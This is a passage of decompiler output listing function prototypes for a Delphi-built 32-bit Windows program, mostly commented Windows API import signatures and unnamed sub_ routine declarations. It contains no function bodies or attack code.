// HRSRC __stdcall FindResourceExW(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage);
// HRSRC __stdcall FindResourceW(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
// BOOL __stdcall FlushInstructionCache(HANDLE hProcess, LPCVOID lpBaseAddress, DWORD dwSize);
// DWORD __stdcall FormatMessageW(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPWSTR lpBuffer, DWORD nSize, va_list *Arguments);
// BOOL __stdcall FreeEnvironmentStringsW(LPWSTR);
// BOOL __stdcall FreeLibrary_1(HMODULE hLibModule);
signed __int32 __stdcall sub_40C490(volatile signed __int32 *a1);
// BOOL __stdcall FreeResource(HGLOBAL hResData);
// LPWSTR __stdcall GetCommandLineW_0();
// DWORD __stdcall GetCompressedFileSizeW(LPCWSTR lpFileName, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetCurrentDirectoryW(DWORD nBufferLength, LPWSTR lpBuffer);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentProcessId();
// HANDLE __stdcall GetCurrentThread();
// DWORD __stdcall GetCurrentThreadId_0();
// int __stdcall GetDateFormatW(LCID Locale, DWORD dwFlags, const SYSTEMTIME *lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate);
// BOOL __stdcall GetDiskFreeSpaceExW(LPCWSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes);
// LPWSTR __stdcall GetEnvironmentStringsW();
// DWORD __stdcall GetEnvironmentVariableW(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);
// BOOL __stdcall GetExitCodeThread(HANDLE hThread, LPDWORD lpExitCode);
// DWORD __stdcall GetFileAttributesW(LPCWSTR lpFileName);
// BOOL __stdcall GetFileAttributesExW(LPCWSTR lpFileName, GET_FILEEX_INFO_LEVELS fInfoLevelId, LPVOID lpFileInformation);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetFullPathNameW(LPCWSTR lpFileName, DWORD nBufferLength, LPWSTR lpBuffer, LPWSTR *lpFilePart);
// DWORD __stdcall GetLastError_1();
// int __stdcall GetLocaleInfoW_0(LCID Locale, LCTYPE LCType, LPWSTR lpLCData, int cchData);
// int __stdcall GetLocaleInfoW_1(LCID Locale, LCTYPE LCType, LPWSTR lpLCData, int cchData);
// DWORD __stdcall GetModuleFileNameW_0(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// DWORD __stdcall GetModuleFileNameW_1(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleW_1(LPCWSTR lpModuleName);
// HMODULE __stdcall GetModuleHandleW_2(LPCWSTR lpModuleName);
// FARPROC __stdcall GetProcAddress_1(HMODULE hModule, LPCSTR lpProcName);
FARPROC __stdcall sub_40C598(HMODULE hModule, LPCSTR lpProcName);
// DWORD __stdcall GetLongPathNameW(LPCWSTR lpszShortPath, LPWSTR lpszLongPath, DWORD cchBuffer);
// HANDLE __stdcall GetStdHandle_0(DWORD nStdHandle);
// UINT __stdcall GetSystemDirectoryW(LPWSTR lpBuffer, UINT uSize);
__int32 __fastcall sub_40C658(__int32 a1);
// void __stdcall GetNativeSystemInfo(LPSYSTEM_INFO lpSystemInfo);
// void __stdcall GetSystemInfo_0(LPSYSTEM_INFO lpSystemInfo);
// void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
// DWORD __stdcall GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
// BOOL __stdcall GetThreadContext(HANDLE hThread, LPCONTEXT lpContext);
// LCID __stdcall GetThreadLocale();
// DWORD __stdcall GetTickCount_0();
// DWORD __stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// LCID __stdcall GetUserDefaultLCID();
// BOOL __stdcall GetVersionExW(LPOSVERSIONINFOW lpVersionInformation);
// BOOL __stdcall GetVersionExW_1(LPOSVERSIONINFOW lpVersionInformation);
// BOOL __stdcall GetVolumeInformationW(LPCWSTR lpRootPathName, LPWSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPWSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// void __stdcall InitializeCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall IsBadReadPtr(const void *lp, UINT_PTR ucb);
// BOOL __stdcall IsValidLocale_0(LCID Locale, DWORD dwFlags);
// void __stdcall LeaveCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// HMODULE __stdcall LoadLibraryExW_0(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName);
// HGLOBAL __stdcall LoadResource(HMODULE hModule, HRSRC hResInfo);
// HLOCAL __stdcall LocalFree_0(HLOCAL hMem);
// LPVOID __stdcall LockResource(HGLOBAL hResData);
// LPVOID __stdcall MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// BOOL __stdcall MoveFileW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// BOOL __stdcall MoveFileExW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// void __stdcall OutputDebugStringW(LPCWSTR lpOutputString);
// BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
// void __stdcall RaiseException_1(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall ReadFileEx(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPOVERLAPPED lpOverlapped, LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
// BOOL __stdcall ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, DWORD nSize, LPDWORD lpNumberOfBytesRead);
// BOOL __stdcall ReleaseMutex(HANDLE hMutex);
// BOOL __stdcall RemoveDirectoryW(LPCWSTR lpPathName);
// BOOL __stdcall ResetEvent(HANDLE hEvent);
// DWORD __stdcall ResumeThread(HANDLE hThread);
// BOOL __stdcall SetEndOfFile(HANDLE hFile);
// BOOL __stdcall SetEnvironmentVariableW(LPCWSTR lpName, LPCWSTR lpValue);
// UINT __stdcall SetErrorMode(UINT uMode);
// BOOL __stdcall SetEvent(HANDLE hEvent);
// BOOL __stdcall SetFileAttributesW(LPCWSTR lpFileName, DWORD dwFileAttributes);
// BOOL __stdcall SetNamedPipeHandleState(HANDLE hNamedPipe, LPDWORD lpMode, LPDWORD lpMaxCollectionCount, LPDWORD lpCollectDataTimeout);
// DWORD __stdcall SizeofResource(HMODULE hModule, HRSRC hResInfo);
// void __stdcall Sleep_0(DWORD dwMilliseconds);
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwExitCode);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// BOOL __stdcall VerifyVersionInfoW(LPOSVERSIONINFOEXW lpVersionInformation, DWORD dwTypeMask, DWORDLONG dwlConditionMask);
// ULONGLONG __stdcall VerSetConditionMask(ULONGLONG ConditionMask, DWORD TypeMask, BYTE Condition);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall VirtualQuery_0(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, DWORD dwLength);
// DWORD __stdcall VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, DWORD dwLength);
// DWORD __stdcall WaitForMultipleObjectsEx(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds, BOOL bAlertable);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// DWORD __stdcall WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
// int __stdcall WideCharToMultiByte_0(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
// BOOL __stdcall WriteFile_1(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall WriteFileEx(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPOVERLAPPED lpOverlapped, LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
// BOOL __stdcall GetFileVersionInfoW(LPWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
// DWORD __stdcall GetFileVersionInfoSizeW(LPWSTR lptstrFilename, LPDWORD lpdwHandle);
// BOOL __stdcall VerQueryValueW(const LPVOID pBlock, LPWSTR lpSubBlock, LPVOID *lplpBuffer, PUINT puLen);
// DWORD __stdcall CharLowerBuffW(LPWSTR lpsz, DWORD cchLength);
// LPWSTR __stdcall CharUpperW(LPWSTR lpsz);
// DWORD __stdcall CharUpperBuffW(LPWSTR lpsz, DWORD cchLength);
// HWND __stdcall FindWindowW(LPCWSTR lpClassName, LPCWSTR lpWindowName);
// HWND __stdcall GetActiveWindow();
// int __stdcall GetSystemMetrics(int nIndex);
// DWORD __stdcall GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
// int __stdcall LoadStringW_0(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int nBufferMax);
// int __stdcall MessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
// int __stdcall MessageBoxW_0(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
// LRESULT __stdcall SendMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// LRESULT __stdcall SendMessageW_0(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// LRESULT __stdcall SendMessageTimeoutW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, UINT fuFlags, UINT uTimeout, PDWORD_PTR lpdwResult);
int __fastcall sub_40C8C8(void *a1, const void *a2, int a3);
int __fastcall sub_40C8D0(_WORD *a1, int a2);
int sub_40C8D8();
int __fastcall sub_40C8DC(unsigned __int16 a1, unsigned __int16 a2);
DWORD sub_40C8EC();
BOOL sub_40C928();
__int16 *sub_40CD9C();
int sub_411B24();
char __fastcall sub_411B84(unsigned int a1);
bool __fastcall sub_411BC4(unsigned __int16 *a1);
bool __fastcall sub_411C18(unsigned __int16 *a1);
void sub_411C68();
int __fastcall sub_411EAC(int a1, int a2);
_DWORD *sub_4147F8();
// int __usercall sub_414828@<eax>(int a1@<eax>, int a2@<ebp>, int a3@<edi>, int a4@<esi>);
// int __usercall sub_414840@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebp>);
int __cdecl sub_414864(int a1);
// char __usercall sub_41488C@<al>(__int16 a1@<ax>, int a2);
// char __usercall sub_4148CC@<al>(__int16 *a1@<eax>, int a2);
char __fastcall sub_4148FC(_WORD *a1, int a2);
_WORD *__fastcall sub_4149F8(int a1, int *a2, int a3);
unsigned __int8 __fastcall sub_414B20(unsigned __int8 a1, const signed __int32 *a2);
unsigned __int8 __fastcall sub_414B2C(unsigned __int16 a1, const signed __int32 *a2);
unsigned __int16 __fastcall sub_414B3C(int a1, unsigned __int16 **a2, int a3);
unsigned __int16 __fastcall sub_414B8C(int a1, unsigned __int16 **a2, int a3);
// _DWORD __fastcall Sysutils::CompareMem(void *, void *, int); idb
// int __fastcall Sysutils::AnsiCompareText(int cchCount1, int cchCount2); idb
volatile __int32 *__fastcall sub_414CB4(int a1, volatile __int32 *a2);
int __fastcall sub_414D44(unsigned int a1, unsigned __int8 a2, int *a3);
int __fastcall sub_414E40(unsigned __int8 a1, int *a2, int a3, unsigned __int64 a4);
int __fastcall sub_415150(signed int a1, int *a2);
int __fastcall sub_415178(int *a1, int a2, int a3, signed __int64 a4);
// int __fastcall unknown_libname_74(_DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD); weak
_DWORD *__fastcall sub_4151EC(unsigned int a1, int a2, int a3, __int16 a4, int *a5);
_DWORD *__fastcall sub_4152F4(int a1, int a2, __int16 a3, unsigned __int64 a4, int *a5);
_DWORD *__fastcall sub_415414(unsigned int a1, int a2, int *a3);
_DWORD *__fastcall sub_41544C(int a1, int *a2, unsigned __int64 a3);
_DWORD *__fastcall sub_4154B0(unsigned int a1, int a2, int *a3);
_DWORD *__fastcall sub_4154C8(int a1, int *a2, unsigned __int64 a3);
// _DWORD __fastcall Sysutils::StrToIntDef(const int System::AnsiString, int); idb
// _DWORD __fastcall Sysutils::TryStrToInt(const int System::AnsiString, int *); idb
volatile __int32 *sub_415520();
// int __usercall sub_4155C8@<eax>(int *a1@<eax>, int a2@<edx>, int a3);
int __fastcall sub_415618(int a1, bool *a2);
// _DWORD __fastcall Sysutils::BoolToStr(bool, bool); idb
int __fastcall sub_415710(int a1, char a2);
// _DWORD __fastcall Sysutils::FileRead(HANDLE hFile, void *lpBuffer, DWORD nNumberOfBytesToRead); idb
DWORD __fastcall sub_415794(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
// _DWORD __fastcall Sysutils::FileSeek(HANDLE hFile, LONG lDistanceToMove, DWORD dwMoveMethod); idb
// _DWORD __fastcall Sysutils::FileSeek(HANDLE hFile, const __int64, DWORD dwMoveMethod); idb
BOOL __fastcall sub_41581C(HANDLE hObject);
_DWORD *__fastcall sub_415824(int a1, _DWORD *a2);
_WORD *__fastcall sub_4158D4(_WORD *result);
// int __fastcall unknown_libname_77(_DWORD, _DWORD, _DWORD); weak
void *__fastcall sub_415900(void *a1, void *a2, unsigned int a3);
int __fastcall sub_41593C(unsigned __int16 *a1, _WORD *a2, unsigned int a3);
int __fastcall sub_415978(_WORD *a1, _WORD *a2, unsigned int a3);
_WORD *__fastcall sub_4159E4(_WORD *a1, __int16 a2);
_WORD *__fastcall sub_415A14(_WORD *a1, _WORD *a2);
int __fastcall sub_415A6C(int a1, _WORD *a2, int a3, unsigned int a4);
// int __usercall sub_415ACC@<eax>(int a1@<eax>, int a2@<edx>, unsigned int a3@<ecx>, int a4@<ebp>);
int __fastcall sub_415B28(_WORD *a1, unsigned int a2, unsigned int a3, unsigned int a4, int a5, int a6);
int __fastcall sub_415B48(_WORD *a1, unsigned int a2, unsigned int a3, unsigned int a4, int a5, int a6, int a7);
_WORD *__fastcall sub_415B68(_WORD *a1, unsigned int a2, unsigned int a3, int a4, int a5);
_WORD *__fastcall sub_415B84(_WORD *a1, unsigned int a2, unsigned int a3, int a4, int a5, int a6);
int __stdcall sub_415BD0(int a1);
// _DWORD __stdcall unknown_libname_78(_DWORD, _DWORD); weak
_DWORD *__fastcall sub_415C10(int *a1, unsigned int a2, int a3, int a4, int a5);
// int __usercall sub_415D08@<eax>(int a1@<eax>, int a2@<edx>, int a3);
// int __usercall sub_415D7C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
_DWORD *__fastcall sub_415EFC(_DWORD *a1, _DWORD *a2);
int __fastcall sub_415F48(_WORD *a1, unsigned int a2, unsigned int a3, unsigned int a4, int a5, int a6, int a7);
// int __usercall sub_416908@<eax>(__int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, _BYTE *a5@<edi>);
// _DWORD __stdcall unknown_libname_79(_DWORD, _DWORD, _DWORD, char); weak
unsigned int __fastcall sub_41698C(char *a1, int a2, char a3, unsigned __int8 a4, int a5, int a6, int a7);
int sub_416A92(); // weak
// char __usercall sub_416A9E@<al>(char *a1@<esi>);
// __int16 __usercall sub_416AA9@<ax>(int a1@<ebp>, _WORD *a2@<edi>);
// char __usercall sub_416AB6@<al>(int a1@<ebp>, _WORD *a2@<edi>, unsigned __int8 *a3@<esi>);
// char __usercall sub_416B63@<al>(int a1@<ebp>, _WORD *a2@<edi>, char *a3@<esi>);
// void __usercall sub_416BDB(int a1@<ebp>, _WORD *a2@<edi>);
// void __usercall sub_416C32(int a1@<ebp>, _WORD *a2@<edi>);
// void __usercall sub_416C42(int a1@<eax>, _BYTE *a2@<edx>, _BYTE *a3@<ecx>, int a4@<ebp>);
// unsigned int __userpurge sub_416CAC@<eax>(int a1@<edx>, char a2@<cl>, __int16 *a3@<esi>, int a4, int a5);
// __int16 __usercall sub_416D97@<ax>(int a1@<ecx>, int a2@<ebp>);
// int __usercall sub_416DE6@<eax>(int a1@<ebp>, __int16 *a2@<esi>);
// unsigned int __usercall sub_416EB9@<eax>(int a1@<ebp>);
// char __usercall sub_416FA6@<al>(int a1@<eax>, _BYTE *a2@<ebx>, int a3@<ebp>, _WORD *a4@<edi>);
// char __usercall sub_416FC7@<al>(int a1@<eax>, _BYTE *a2@<ebx>, int a3@<ebp>, _WORD *a4@<edi>);
// _DWORD __stdcall Sysutils::FloatToDecimal(_DWORD, _DWORD); weak
char __fastcall sub_41724C(__int16 *a1, long double *a2, char a3, int a4);
// __int16 __usercall sub_41731E@<ax>(__int16 *@<esi>);
// long double __usercall sub_41732F@<st0>(int a1@<ebp>, __int16 *a2@<esi>, long double result@<st0>);
// __int16 __usercall sub_417352@<ax>(_WORD *@<esi>);
// int __fastcall Sysutils::TryStrToFloat(_DWORD, _DWORD); weak
// int Sysutils::TryStrToCurr(void); weak
_DWORD *__fastcall sub_4173D8(int a1, _DWORD *a2, int a3, char a4, int a5, int a6);
_DWORD *__fastcall sub_41740C(int a1, _DWORD *a2, int a3, char a4, int a5);
// _DWORD *__userpurge sub_417440@<eax>(int a1@<eax>, __int16 *a2@<edx>, int a3@<ecx>, int a4@<edi>, char a5, int a6, int a7);
int sub_4174A0();
int sub_4174AC();
int __fastcall sub_4174B4(int a1, double *a2);
int __fastcall sub_4174F8(int a1, float *a2);
int sub_41753C();
// int __stdcall Sysutils::DateTimeToTimeStamp(double); idb
// int *__usercall sub_417588@<eax>(int *result@<eax>, int a2@<ebp>);
// long double __fastcall Sysutils::TimeStampToDateTime(_DWORD); weak
// long double __fastcall Sysutils::TimeStampToMSecs(_DWORD); weak
int __fastcall sub_417624(unsigned __int16 a1, unsigned __int16 a2, unsigned __int16 a3, unsigned __int16 a4, double *a5);
// _DWORD __fastcall Sysutils::DecodeTime(const int System::TDateTime, unsigned __int16 *, unsigned __int16 *, unsigned __int16 *, unsigned __int16 *); idb
// _DWORD __fastcall Sysutils::IsLeapYear(unsigned __int16); idb
// _DWORD __stdcall Sysutils::TryEncodeDate(_DWORD); weak
// _DWORD __fastcall Sysutils::EncodeDate(unsigned __int16, unsigned __int16, unsigned __int16); idb
// _DWORD __fastcall Sysutils::DecodeDate(const int System::TDateTime, unsigned __int16 *, unsigned __int16 *, unsigned __int16 *); idb
// _DWORD __fastcall Sysutils::DateTimeToSystemTime(const int System::TDateTime, _SYSTEMTIME *); idb
int __fastcall sub_417A1C(unsigned __int16 *a1, double *a2);
// _DWORD __fastcall Sysutils::DayOfWeek(const int System::TDateTime); idb
// _DWORD __cdecl Sysutils::Date(); idb
// _DWORD __cdecl Sysutils::Now(); idb
// _DWORD __cdecl Sysutils::CurrentYear(); idb
// int __usercall sub_417B64@<eax>(const void *a1@<eax>, int a2@<edx>, int a3);
// _DWORD __cdecl unknown_libname_80(_DWORD); weak
// int __usercall sub_417C6C@<eax>(int a1@<eax>, int a2@<edx>, int a3);
int __cdecl sub_417CB8(int a1);
int __cdecl sub_417CEC(int a1);
int __cdecl sub_417D24(int a1);
// _DWORD *__usercall sub_417D64@<eax>(int *a1@<edx>, int a2@<eax>, int a3);
// _DWORD *__usercall sub_417EE0@<eax>(int a1@<eax>, int *a2@<edx>, int a3);
// int __usercall sub_417FFC@<eax>(unsigned __int16 *a1@<eax>, int System::TDateTime);
_DWORD *__fastcall sub_4188D0(volatile __int32 *a1, unsigned __int16 *a2, void *a3, int a4, int a5);
// _DWORD __stdcall Sysutils::DateTimeToStr(_DWORD, _DWORD); weak
int __fastcall sub_418A8C(int a1, int *a2);
int __fastcall sub_418AB4(int a1, int *a2, _WORD *a3, _BYTE *a4);
int __fastcall sub_418B4C(int a1, int *a2, int a3);
int __fastcall sub_418BDC(int a1, int *a2, __int16 a3);
int __fastcall sub_418C14(int a1);
__int16 __fastcall sub_418C68(int a1, int *a2);
// _DWORD __cdecl unknown_libname_81(_DWORD); weak
int __fastcall sub_418D1C(int a1, int *a2, int a3, int a4);
// _DWORD __stdcall unknown_libname_82(_DWORD); weak
// int unknown_libname_83(void); weak
// int __usercall sub_4192D8@<eax>(int a1@<eax>, double *a2@<edx>, int a3@<ecx>, int a4@<ebx>);
HLOCAL __fastcall sub_4194F8(DWORD dwMessageId, LPCVOID lpSource, _DWORD *a3);
volatile __int32 *__fastcall sub_41957C(LCID Locale, LCTYPE LCType, int a3, volatile __int32 *a4);
int __fastcall sub_4195C8(LCID Locale, LCTYPE LCType, int a3);
// int __usercall sub_4195F4@<eax>(LCID Locale@<eax>, int a2@<edx>, int a3@<edi>);
int __fastcall sub_4199E8(LCID a1, int a2);
// int __usercall sub_419AA4@<eax>(LCID Locale@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
BOOL __stdcall CalInfoEnumProc(LPWSTR); // idb
BOOL __stdcall sub_419C90(LPWSTR); // idb
_DWORD *__fastcall sub_419D28(LCID Locale, int a2);
int **__fastcall sub_41A004(LCID Locale, LCTYPE LCType, int a3, int a4, int a5, volatile __int32 *a6);
// _WORD *__usercall sub_41A040@<eax>(int *a1@<eax>, int a2);
// _DWORD *__userpurge sub_41A084@<eax>(LCID Locale@<eax>, LCTYPE a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, volatile __int32 *a7, int a8);
int __fastcall sub_41A370(int a1, int a2);
// int __fastcall unknown_libname_84(_DWORD); weak
int __fastcall sub_41A408(int *a1, LPCVOID lpAddress, _WORD *a3, int a4);
_DWORD *__fastcall sub_41A600(int *a1, const void *a2);
// int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD); weak
// int __fastcall Sysutils::Exception::Exception(int, int, int); idb
// int __fastcall Sysutils::Exception::Exception(int, int, int, int, int); idb
int sub_41A8D0();
int __fastcall sub_41A914(int result);
_DWORD *__fastcall sub_41A920(int a1, _DWORD *a2);
char __fastcall sub_41A948(int a1, int a2);
char __fastcall sub_41A974(int a1);
int __fastcall sub_41A99C(int result, int a2);
void *__fastcall sub_41A9A0(int a1, int *a2);
int __fastcall sub_41A9F8(int result);
// int unknown_libname_86(void); weak
// int __usercall sub_41AA6C@<eax>(unsigned __int8 a1@<al>, int a2@<edx>, int a3@<ebp>, int a4@<edi>, int a5@<esi>);
// int __usercall sub_41AADC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, int a7);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
// int __usercall sub_41ABC4@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>);
// int __fastcall unknown_libname_87(_DWORD); weak
int (**__fastcall sub_41AC5C(int a1))();
int __cdecl sub_41AC80(int a1);
int *__fastcall sub_41AE98(int *a1);
char __fastcall sub_41AF7C(int a1);
void *sub_41B040();
void *sub_41B0C0();
DWORD __fastcall sub_41B0D0(HANDLE hHandle, DWORD dwMilliseconds);
signed __int32 __fastcall sub_41B0D8(volatile signed __int32 *a1, volatile signed __int32 *a2);
signed __int32 *__fastcall sub_41B0EC(volatile signed __int32 *a1);
HANDLE sub_41B108();
int __fastcall sub_41B16C(HANDLE hObject); // idb
HANDLE sub_41B190();
signed __int32 __fastcall sub_41B1D0(signed __int32 a1);
DWORD __fastcall sub_41B1FC(HANDLE hEvent, HANDLE hHandle, DWORD dwMilliseconds);
int *sub_41B230();
int __fastcall sub_41B23C(int result);
// int __usercall sub_41B26C@<eax>(int result@<eax>, int a2@<edx>, long double a3@<st0>);
// int __usercall sub_41B2D0@<eax>(long double a1@<st0>);
// DWORD __stdcall NetWkstaGetInfo(LPWSTR servername, DWORD level, LPBYTE *bufptr);
// DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
// int __usercall sub_41B30C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, int a3@<ebx>);
int sub_41B35C();
int __fastcall sub_41B3B4(__int32 a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __fastcall sub_41B4CC(int a1, int a2);
// _DWORD __fastcall Sysutils::ByteToCharLen(const int System::AnsiString, int); idb
int __fastcall sub_41B530(int a1, int a2);
int *__fastcall sub_41B5A0(int a1, int a2, int *a3, int *a4);
__int64 __fastcall sub_41B640(int a1, int a2);
__int64 __fastcall sub_41B6D4(int a1, int a2);
int __fastcall sub_41B738(_WORD *a1);
unsigned __int16 *__fastcall sub_41B768(unsigned __int16 *result);
int __fastcall sub_41B798(int a1, int a2);
int __fastcall sub_41B7DC(int a1, int a2);
int __fastcall sub_41B828(int a1, int a2);
_WORD *__fastcall sub_41B888(_WORD *a1, _WORD *a2);
_WORD *__fastcall sub_41B890(_WORD *a1, __int16 a2);
// _DWORD __cdecl unknown_libname_90(_DWORD); weak
int sub_41B8F4();
// int __usercall sub_41B988@<eax>(int a1@<ecx>, int a2@<edi>);
int __fastcall nullsub_5(_DWORD); // weak
unsigned int __fastcall sub_41BB5C(LPCSTR lpMultiByteStr);
unsigned int __fastcall sub_41BBF0(const CHAR *a1);
int sub_41BC28();
_DWORD *__fastcall sub_41BC58(_DWORD *result);
// void __stdcall Sleep_1(DWORD dwMilliseconds);
// _DWORD *__usercall sub_41BD80@<eax>(int a1@<edi>);
// _DWORD *__usercall sub_41BD90@<eax>(DWORD dwMessageId@<eax>, int a2@<edx>, int a3@<edi>);
int sub_41BE44();
// int __fastcall unknown_libname_93(_DWORD); weak
// _DWORD __fastcall Sysutils::TThreadLocalCounter::HashIndex(Sysutils::TThreadLocalCounter *__hidden this); idb
int *__fastcall sub_41BF54(Sysutils::TThreadLocalCounter *this, int **a2);
// int __fastcall Sysutils::TThreadLocalCounter::Delete(_DWORD, _DWORD); weak
int *__fastcall sub_41BFCC(Sysutils::TThreadLocalCounter *this);
// _DWORD __fastcall Sysutils::TMultiReadExclusiveWriteSynchronizer::TMultiReadExclusiveWriteSynchronizer(Sysutils::TMultiReadExclusiveWriteSynchronizer *__hidden this); idb
_DWORD *sub_41C07C();
BOOL __fastcall sub_41C0C4(int a1);
BOOL __fastcall sub_41C0D0(int a1);
// _DWORD __fastcall Sysutils::TMultiReadExclusiveWriteSynchronizer::UnblockOneWriter(Sysutils::TMultiReadExclusiveWriteSynchronizer *__hidden this); idb
// _DWORD __fastcall Sysutils::TMultiReadExclusiveWriteSynchronizer::WaitForWriteSignal(Sysutils::TMultiReadExclusiveWriteSynchronizer *__hidden this); idb
signed __int32 __fastcall sub_41C108(volatile signed __int32 *a1, unsigned int a2);
// int __usercall sub_41C118@<eax>(Sysutils::TMultiReadExclusiveWriteSynchronizer *this@<eax>, int a2@<ebx>);
int *__fastcall sub_41C1D0(Sysutils::TMultiReadExclusiveWriteSynchronizer *this, int a2, int *a3);
int __fastcall sub_41C298(Sysutils::TMultiReadExclusiveWriteSynchronizer *this, int a2, int *a3);
// int __fastcall unknown_libname_94(_DWORD); weak
int __fastcall sub_41C314(int *a1);
int __fastcall sub_41C320(int a1, int a2, int a3, int a4, int cchCount2, char a6);
int __fastcall sub_41C344(int a1, int a2, int a3, int a4, int cchCount1, int cchCount2, char a7, LCID Locale);
// int __fastcall sub_41C398(_DWORD); weak
int __fastcall sub_41C3F8(int a1, int a2, int a3, int a4, int cchCount1, int cchCount2, unsigned __int16 a7, LCID Locale);
int __fastcall sub_41C49C(int a1, int a2, int a3, int a4, int cchCount2, char a6, LCID Locale);
bool __fastcall sub_41C4C0(int *a1, int a2);
int __fastcall sub_41C4DC(int a1, int a2, int a3, int a4, int *a5);
int __fastcall sub_41C518(void *a1, int a2, int *a3);
int __fastcall sub_41C548(_DWORD *a1, int a2);
int __fastcall sub_41C550(int *a1, int a2);
_DWORD *__fastcall sub_41C5B4(int *a1, int a2, _DWORD *a3);
